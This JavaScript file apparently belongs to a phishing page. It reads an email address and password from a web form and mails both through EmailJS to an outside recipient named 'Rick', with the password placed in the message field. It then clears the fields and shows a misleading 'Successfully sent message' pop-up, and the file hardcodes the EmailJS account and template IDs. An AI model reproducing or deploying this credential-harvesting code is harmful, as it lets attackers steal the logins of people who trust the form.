(function () {
  emailjs.init("user_ESDjKTcJyUrjiqhGOMJ3G");
})();

function validate() {
  let email = document.querySelector(".email");
  let password = document.querySelector(".password");
  let btn = document.querySelector(".submit");

  btn.addEventListener("click", (e) => {
    e.preventDefault();
    //validate email
    let regexEmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/;
    if (email.value.match(regexEmail)) {
      if (email.value === "" || password.value === "") {
        emptyerror();
      } else {
        sendmail(email.value, password.value);
        email.value = "";
        password.value = "";
        success();
      }
    } else {
      error();
      email.value = "";
      password.value = "";
    }
  });
}
validate();

function sendmail(email, password) {
  emailjs.send("service_ll5oava", "template_cvjri3e", {
    to_name: "Rick",
    from_name: email,
    message: password,
  });
}

function emptyerror() {
  Swal.fire({
    icon: "error",
    title: "Oops...",
    text: "Fields cannot be empty!",
  });
}

function error() {
  Swal.fire({
    icon: "error",
    title: "Oops...",
    text: "Please Give Valid Information",
  });
}

function success() {
  Swal.fire({
    icon: "success",
    title: "Success...",
    text: "Successfully sent message",
  });
  const closeModel = document.getElementById("contact-submit");
  closeModel.setAttribute("data-bs-dismiss", "modal");
}
